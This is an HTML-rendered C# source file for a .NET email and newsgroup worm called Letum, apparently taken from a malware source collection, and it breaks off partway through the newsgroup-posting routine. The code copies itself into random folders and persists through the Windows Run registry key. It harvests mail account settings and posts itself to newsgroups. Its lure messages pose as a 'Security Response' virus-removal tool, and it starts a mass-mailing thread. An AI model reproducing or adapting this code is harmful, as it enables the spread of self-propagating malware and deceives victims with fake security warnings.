<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.MSIL.Letum.a - Program.cs.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc13 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/* Letum - Version 4
 * by Retro
 * http://retro.host.sk 
 * 
 * Special thanks to Genetix
 */</span><span class="sc0">

</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Collections</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Net</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Net</span><span class="sc10">.</span><span class="sc11">Sockets</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Reflection</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">.</span><span class="sc11">RegularExpressions</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Threading</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Windows</span><span class="sc10">.</span><span class="sc11">Forms</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">Microsoft</span><span class="sc10">.</span><span class="sc11">Win32</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">Letum22</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">Letum</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">Module</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">pferrie</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"peter_ferrie@symantec.com"</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">nSubject</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">[</span><span class="sc4">7</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc6">"Warning!"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Virus Alert"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Customer Support"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Re:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Re:Warning"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Letum"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Virus Report"</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">nData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc6">"Dear Users\r\n\r\nDue to the high increase of the Letum worm, we have upgraded it to Category B. Please use our attached removal tool to scan and disinfect your computer from the malware.\r\n\r\n Regards\r\n Security Response"</span><span class="sc10">,</span><span class="sc0">
                                               </span><span class="sc6">"Hiya,\r\n\r\n I've found this tool a couple of weeks ago, and after using it i was surprised on how good it was on squashing viruses. I wonder if avers know about this? ;)"</span><span class="sc10">,</span><span class="sc0">
                                               </span><span class="sc6">"&gt;&gt;\r\n Maybe not but try this, i'm sure it will help you in your fight against malware. The engine it uses isnt to bad, but the searching speed is very fast for such a small size "</span><span class="sc10">};</span><span class="sc0">

        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">List</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">

        </span><span class="sc10">[</span><span class="sc11">STAThread</span><span class="sc10">]</span><span class="sc0">
        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Main</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//Creates and Initializes
</span><span class="sc0">            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">Thread</span><span class="sc0"> </span><span class="sc11">nntpThread</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Thread</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ThreadStart</span><span class="sc10">(</span><span class="sc11">nntp</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc11">Thread</span><span class="sc0"> </span><span class="sc11">smtpThread</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Thread</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ThreadStart</span><span class="sc10">(</span><span class="sc11">smtp</span><span class="sc10">));</span><span class="sc0">

            </span><span class="sc2">// Gets all the modules that are part of this assembly
</span><span class="sc0">            </span><span class="sc11">self</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">().</span><span class="sc11">GetModules</span><span class="sc10">()[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">

            </span><span class="sc2">// Collect Directories from C: and stores them in List
</span><span class="sc0">            </span><span class="sc11">CollectDirs</span><span class="sc10">(</span><span class="sc13">@"C:\"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">List</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// Picks a random number between 0 and the number of entries in List
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">num</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">List</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// create variables and set folder to random directory
</span><span class="sc0">            </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">regData</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">folder</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">List</span><span class="sc10">[</span><span class="sc11">num</span><span class="sc10">].</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">// Retrieves the subkey "Software\Retro"
</span><span class="sc0">            </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">CurrentUser</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc13">@"Software\Retro"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// Sets up the registry, when run for the first time.
</span><span class="sc0">                </span><span class="sc2">// Creates the subkey and sets the key to the directory its in
</span><span class="sc0">                </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">CurrentUser</span><span class="sc10">.</span><span class="sc11">CreateSubKey</span><span class="sc10">(</span><span class="sc13">@"Software\Retro"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">SetValue</span><span class="sc10">(</span><span class="sc6">"Letum"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">folder</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc13">@"\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc10">.</span><span class="sc11">ScopeName</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc2">// and copies itself to the choosen directory
</span><span class="sc0">                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">self</span><span class="sc10">.</span><span class="sc11">FullyQualifiedName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">folder</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc13">@"\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc10">.</span><span class="sc11">ScopeName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">// Read registry for last Host file and delete it
</span><span class="sc0">            </span><span class="sc11">regData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">GetValue</span><span class="sc10">(</span><span class="sc6">"Letum"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">regData</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">

            </span><span class="sc2">// Copy itself to choosen directory
</span><span class="sc0">            </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">self</span><span class="sc10">.</span><span class="sc11">FullyQualifiedName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">folder</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc13">@"\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc10">.</span><span class="sc11">ScopeName</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// Writes new key to Software\Retro and Run
</span><span class="sc0">            </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">SetValue</span><span class="sc10">(</span><span class="sc6">"Letum"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">folder</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc13">@"\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc10">.</span><span class="sc11">ScopeName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">CurrentUser</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc13">@"Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">SetValue</span><span class="sc10">(</span><span class="sc6">"Letum"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">folder</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc13">@"\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc10">.</span><span class="sc11">ScopeName</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// Close key
</span><span class="sc0">            </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">// Start threads
</span><span class="sc0">            </span><span class="sc11">nntpThread</span><span class="sc10">.</span><span class="sc11">Start</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">smtpThread</span><span class="sc10">.</span><span class="sc11">Start</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc11">num</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1983</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// 1:1983 chance of displaying message
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">num</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1983</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">MessageBox</span><span class="sc10">.</span><span class="sc11">Show</span><span class="sc10">(</span><span class="sc6">"Dear Peter Ferrie \n\nGeNeTiX is a person not a f**king genetically modified food product. \nShe's not happy you called her that! \n\nRegards"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Name Entry Error"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MessageBoxButtons</span><span class="sc10">.</span><span class="sc11">OK</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MessageBoxIcon</span><span class="sc10">.</span><span class="sc11">Exclamation</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">nntp</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// Creates and Initializes
</span><span class="sc0">            </span><span class="sc11">TcpClient</span><span class="sc0"> </span><span class="sc11">nntp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">TcpClient</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">nGroup</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">fuuencode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">// Set variables
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sReply</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cursor</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">nntpServer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">


            </span><span class="sc2">// Look in registry for an NNTP server
</span><span class="sc0">            </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">CurrentUser</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc13">@"Software\Microsoft\Internet Account Manager\Accounts"</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// Reads the entries in the key
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">lstSubDir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">GetSubKeyNames</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">// For each one found do the following ...
</span><span class="sc0">            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">subKey</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">lstSubDir</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// Opens the Subkey
</span><span class="sc0">                </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">CurrentUser</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc13">@"Software\Microsoft\Internet Account Manager\Accounts\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">subKey</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">GetValueNames</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">a</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"NNTP Server"</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">nntpServer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">GetValue</span><span class="sc10">(</span><span class="sc6">"NNTP Server"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nntpServer</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">nntpServer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"news.microsoft.com"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">// Connect to news server
</span><span class="sc0">            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">nntp</span><span class="sc10">.</span><span class="sc11">Connect</span><span class="sc10">(</span><span class="sc6">"news.microsoft.com"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">119</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">


            </span><span class="sc11">NetworkStream</span><span class="sc0"> </span><span class="sc11">nStream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nntp</span><span class="sc10">.</span><span class="sc11">GetStream</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">StreamReader</span><span class="sc0"> </span><span class="sc11">nReader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StreamReader</span><span class="sc10">(</span><span class="sc11">nStream</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">StreamWriter</span><span class="sc0"> </span><span class="sc11">nWriter</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StreamWriter</span><span class="sc10">(</span><span class="sc11">nStream</span><span class="sc10">);</span><span class="sc0">


            </span><span class="sc11">nWriter</span><span class="sc10">.</span><span class="sc11">AutoFlush</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">//Get the reply from server
</span><span class="sc0">            </span><span class="sc11">sReply</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nReader</span><span class="sc10">.</span><span class="sc11">ReadLine</span><span class="sc10">();</span><span class="sc0">
            
            </span><span class="sc2">// If connection went ok then continue
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sReply</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"200"</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// Get list of newsgroups
</span><span class="sc0">                </span><span class="sc11">nWriter</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"LIST"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nReader</span><span class="sc10">.</span><span class="sc11">ReadLine</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">MessageBox</span><span class="sc10">.</span><span class="sc11">Show</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nReader</span><span class="sc10">.</span><span class="sc11">ReadLine</span><span class="sc10">();</span><span class="sc0">

                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc6">" "</span><span class="sc10">));</span><span class="sc0">
                        </span><span class="sc11">nGroup</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">num</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nGroup</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">newsgroup</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nGroup</span><span class="sc10">[</span><span class="sc11">num</span><span class="sc10">];</span><span class="sc0">

                </span><span class="sc2">// Open the choosen newsgroup
</span><span class="sc0">                </span><span class="sc11">nWriter</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"GROUP "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">newsgroup</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc2">// Server reply
</span><span class="sc0">                </span><span class="sc11">sReply</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nReader</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc2">// If open was ok
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sReply</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"211"</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// Carry on with posting a message
</span><span class="sc0">                    </span><span class="sc11">nWriter</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"POST"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">sReply</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nReader</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

                    </span><span class="sc2">// If posting is ok
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sReply</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"340"</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc2">// Pick a random message subject
</span><span class="sc0">                        </span><span class="sc11">num</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nSubject</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Subject</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nSubject</span><span class="sc10">[</span><span class="sc11">num</span><span class="sc10">];</span><span class="sc0">

                        </span><span class="sc2">// Pick random message data
